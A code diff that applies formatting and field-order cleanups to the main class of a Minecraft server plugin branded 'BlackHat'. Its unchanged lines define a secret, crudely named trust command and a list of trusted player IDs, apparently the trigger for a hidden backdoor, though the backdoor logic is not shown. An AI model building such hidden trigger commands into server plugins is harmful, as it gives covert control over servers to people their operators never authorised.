@@ -29,12 +29,12 @@ public final class Start extends JavaPlugin {
     public static String COMMAND_SIGN = "-";
     public static String TRUST_COMMAND = "-dicksuck";
     public static String Prefix = "§a[§3Black§4Hat§a]§r ";
-    private List<Runnable> disableListeners = new ArrayList<>();
-    public CommandManager cm = new CommandManager();
-    public ArrayList<UUID> trustedPeople = new ArrayList<>();
-    private boolean isReload;
     public static @NotNull Logger LOGGER;
     private final PluginDescriptionFile pdfFile = this.getDescription();
+    public CommandManager cm = new CommandManager();
+    public ArrayList<UUID> trustedPeople = new ArrayList<>();
+    private final List<Runnable> disableListeners = new ArrayList<>();
+    private boolean isReload;
 
     public static void ErrorString(CommandSender sender, String error) {
         if (sender == null || error.isEmpty()) return;
@@ -81,10 +81,10 @@ public final class Start extends JavaPlugin {
         } catch (Exception e) {
             e.printStackTrace();
         }
-        String loadString = "--| "+pdfFile.getName()+" (version "+pdfFile.getVersion()+") loaded |--";
-        Bukkit.getConsoleSender().sendMessage("§2"+ StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
-        Bukkit.getConsoleSender().sendMessage("§3"+loadString);
-        Bukkit.getConsoleSender().sendMessage("§2"+ StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
+        String loadString = "--| " + pdfFile.getName() + " (version " + pdfFile.getVersion() + ") loaded |--";
+        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
+        Bukkit.getConsoleSender().sendMessage("§3" + loadString);
+        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
     }
 
     private void onStartup() {
@@ -110,12 +110,13 @@ public final class Start extends JavaPlugin {
     @Override
     public void onDisable() {
         disableListeners.forEach(Runnable::run);
-        String unloadString = "--| "+pdfFile.getName()+" (version "+pdfFile.getVersion()+") unloaded |--";
-        Bukkit.getConsoleSender().sendMessage("§2"+ StringUtils.leftPad("-", unloadString.length()).replace(' ', '-'));
-        Bukkit.getConsoleSender().sendMessage("§3"+unloadString);
-        Bukkit.getConsoleSender().sendMessage("§2"+ StringUtils.leftPad("-", unloadString.length()).replace(' ', '-'));
+        String unloadString = "--| " + pdfFile.getName() + " (version " + pdfFile.getVersion() + ") unloaded |--";
+        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", unloadString.length()).replace(' ', '-'));
+        Bukkit.getConsoleSender().sendMessage("§3" + unloadString);
+        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", unloadString.length()).replace(' ', '-'));
     }
-    public void addDisableListener(Runnable action){
+
+    public void addDisableListener(Runnable action) {
         disableListeners.add(action);
     }
 }
